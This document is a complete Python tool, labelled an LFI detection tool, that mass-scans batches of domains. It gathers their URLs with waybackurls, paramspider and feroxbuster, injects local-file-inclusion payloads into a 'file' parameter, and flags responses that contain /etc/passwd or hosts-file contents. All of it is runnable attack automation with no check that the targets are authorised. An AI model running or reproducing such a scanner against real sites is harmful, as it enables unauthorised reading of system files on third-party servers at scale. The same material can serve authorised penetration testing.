import subprocess
import requests
import re
import argparse
import os
import concurrent.futures
import logging
import psutil
from rich.console import Console
from rich.table import Table


# Configure logging
logging.basicConfig(filename='lfi_tool.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Initialize the console
console = Console()


def get_dynamic_thread_count():
    """Determine the optimal number of threads based on system resources."""
    try:
        cpu_count = psutil.cpu_count(logical=True)
        cpu_usage = psutil.cpu_percent(interval=1)
        available_memory = psutil.virtual_memory().available / (1024 * 1024)  # Available memory in MB


        # Base thread count based on CPU count
        base_count = min(cpu_count * 2, 50)  # Maximum 50 threads or twice the CPU count


        # Adjust thread count based on CPU usage and available memory
        if cpu_usage > 80:
            return max(base_count // 2, 1)  # Reduce threads if CPU is high
        elif available_memory < 512:
            return max(base_count // 2, 1)  # Reduce threads if memory is low
        else:
            return base_count  # Use base count if resources are sufficient
    except Exception as e:
        logging.error("Error determining thread count: %s", e)
        return 10  # Fallback to a default value if error occurs


def fetch_urls(domain):
    """Fetch URLs with waybackurls and paramspider."""
    try:
        # Fetch URLs with waybackurls
        result = subprocess.run(['waybackurls', domain], capture_output=True, text=True, check=True)
        urls = result.stdout.splitlines()


        # Fetch URLs with paramspider
        paramspider_output = subprocess.run(['paramspider', '-d', domain, '-l', '3', '-o', 'paramspider_output.txt'], capture_output=True, text=True, check=True)
        with open('paramspider_output.txt', 'r') as file:
            paramspider_urls = file.read().splitlines()
        
        # Combine results and remove duplicates
        all_urls = list(set(urls + paramspider_urls))
        return all_urls
    except subprocess.CalledProcessError as e:
        logging.error("Subprocess error fetching URLs for domain %s: %s", domain, e)
        return []
    except Exception as e:
        logging.error("Error fetching URLs for domain %s: %s", domain, e)
        return []


def run_feroxbuster(urls, payloads_file, output_file='feroxbuster_combined_results.txt'):
    """Run feroxbuster on URLs with recursive bruteforce disabled."""
    def process_url(url):
        try:
            # Run feroxbuster with recursive bruteforce disabled
            with open(output_file, 'a') as outfile:
                subprocess.run(['feroxbuster', '-u', url, '-w', payloads_file, '--no-recursion'], stdout=outfile, stderr=subprocess.STDOUT, check=True)
        except subprocess.CalledProcessError as e:
            logging.error("Feroxbuster error running on %s: %s", url, e)
        except Exception as e:
            logging.error("Error running feroxbuster on %s: %s", url, e)


    thread_count = get_dynamic_thread_count()
    console.print("Using [bold yellow]%d[/bold yellow] threads for feroxbuster." % thread_count)
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(process_url, url) for url in urls]
        concurrent.futures.wait(futures)


def test_lfi_vulnerabilities(urls, payloads_file, output_file='lfi_results.txt'):
    """Test for LFI vulnerabilities with concurrent validation and save results."""
    lfi_results = []
    lfi_payloads = []


    try:
        with open(payloads_file, 'r') as file:
            lfi_payloads = file.read().splitlines()
    except Exception as e:
        logging.error("Error reading payloads file %s: %s", payloads_file, e)
        return []


    # Define patterns and content length expectations for known sensitive files
    known_patterns = {
        'etc/passwd': re.compile(r'(root:|bin:|daemon:|nobody:|systemd-)[^:]*:[^:]*'),
        'hosts': re.compile(r'127\.0\.0\.1\s+localhost'),
    }


    def fetch_url(test_url):
        """Fetch URL and test for LFI vulnerabilities."""
        try:
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200:
                content = response.text
                for file_name, pattern in known_patterns.items():
                    if pattern.search(content):
                        if "etc/passwd" in test_url and len(content) > 100:  # Example length check
                            lfi_results.append((test_url, file_name, len(content)))
                        elif "hosts" in test_url:
                            lfi_results.append((test_url, file_name, len(content)))
        except requests.RequestException as e:
            logging.error("Request failed for %s: %s", test_url, e)


    # Prepare URLs with payloads
    urls_with_payloads = [f"{url}?file={payload}" for url in urls for payload in lfi_payloads]


    thread_count = get_dynamic_thread_count()
    console.print("Using [bold yellow]%d[/bold yellow] threads for LFI testing." % thread_count)
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(fetch_url, test_url) for test_url in urls_with_payloads]
        concurrent.futures.wait(futures)


    # Save LFI results to a file
    try:
        with open(output_file, 'w') as file:
            for result in lfi_results:
                file.write("%s | %s | %d\n" % (result[0], result[1], result[2]))
        console.print("LFI results saved to [bold cyan]%s[/bold cyan]" % output_file)
    except Exception as e:
        logging.error("Error writing LFI results to file %s: %s", output_file, e)


    return lfi_results


def display_dashboard(domain, urls, lfi_results):
    """Display a dashboard of results."""
    console.print("\n[bold green]Dashboard for Domain: %s[/bold green]" % domain)
    
    # URLs summary
    console.print("Total URLs Found: [bold yellow]%d[/bold yellow]" % len(urls), style="bold cyan")


    # Results table
    table = Table(title="LFI Vulnerabilities Detected")
    table.add_column("URL", style="dim", width=60)
    table.add_column("File", justify="right", width=20)
    table.add_column("Content Length", justify="right", width=20)


    for result in lfi_results:
        table.add_row(result[0], result[1], str(result[2]))


    console.print(table)


def process_domain_batch(domains, params_file, payloads_file):
    """Process a batch of domains."""
    for domain in domains:
        console.print("\n[bold green]Processing Domain: %s[/bold green]" % domain)
        
        # Fetch and process URLs
        urls = fetch_urls(domain)
        console.print("Found [bold yellow]%d[/bold yellow] URLs." % len(urls))
        
        if urls:
            # Run feroxbuster
            console.print("Running feroxbuster with payloads from [bold cyan]%s[/bold cyan]..." % payloads_file)
            run_feroxbuster(urls, payloads_file)
            
            # Test for LFI vulnerabilities
            console.print("Testing for LFI vulnerabilities...")
            lfi_results = test_lfi_vulnerabilities(urls, payloads_file)
            
            # Display results
            display_dashboard(domain, urls, lfi_results)
        else:
            console.print("No URLs found for the domain.")


def main():
    parser = argparse.ArgumentParser(description="LFI Detection Tool")
    parser.add_argument('-d', '--domain-file', required=True, help="File containing a list of domains")
    parser.add_argument('-p', '--params', required=True, help="File with parameters")
    parser.add_argument('-f', '--payloads', required=True, help="File with payloads")
    parser.add_argument('--batch-size', type=int, default=100, help="Number of domains to process per batch")


    args = parser.parse_args()


    # Read domains from file
    try:
        with open(args.domain_file, 'r') as file:
            domains = file.read().splitlines()
    except Exception as e:
        logging.error("Error reading domain file %s: %s", args.domain_file, e)
        return


    # Process domains in batches
    total_domains = len(domains)
    batch_size = args.batch_size
    for start in range(0, total_domains, batch_size):
        end = min(start + batch_size, total_domains)
        domain_batch = domains[start:end]
        console.print("\nProcessing batch [bold yellow]%d[/bold yellow] of [bold yellow]%d[/bold yellow]" % (start // batch_size + 1, (total_domains + batch_size - 1) // batch_size))
        process_domain_batch(domain_batch, args.params, args.payloads)


if __name__ == "__main__":
    main()
